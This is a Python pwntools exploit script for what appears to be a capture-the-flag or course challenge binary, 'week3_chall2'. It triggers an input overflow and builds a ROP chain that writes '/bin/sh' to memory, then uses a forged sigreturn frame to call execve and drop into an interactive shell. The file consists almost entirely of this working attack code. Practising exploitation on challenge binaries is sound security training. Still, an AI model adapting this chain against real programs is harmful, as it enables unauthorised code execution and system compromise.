#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./week3_chall2")
p = elf.process()

# Specify the architecture because it is needed to create a fake Sigreturn Frame
context.arch = "amd64"

movGadget = 0x0000000000543650 #mov qword ptr [rcx], rdx ; ret
pop_rcx_ret =  0x0000000000460133 # pop rcx ; ret
pop_rdx_ret = 0x000000000040421f # pop rdx ; ret
pop_rax_ret = 0x000000000041d24a # pop rax ; ret
heap = 0x00000000005dd000

# 4,294,967,295
offset = 280
binsh = 0x0068732f6e69622f
junk = b'a'*offset
ret = 0x000000000040101a
syscall = 0x00000000004039c9 # syscall
p.recvuntil("Enter a number: ")
p.sendline('4294967295')
p.recvuntil("Whats Your Name, My Fellow h4x0r: ")

payload = junk + flat(pop_rcx_ret,heap,pop_rdx_ret,binsh,movGadget)

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = heap
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = syscall

payload += flat(pop_rax_ret,0xf,syscall,frame)
p.sendline(payload)
p.interactive()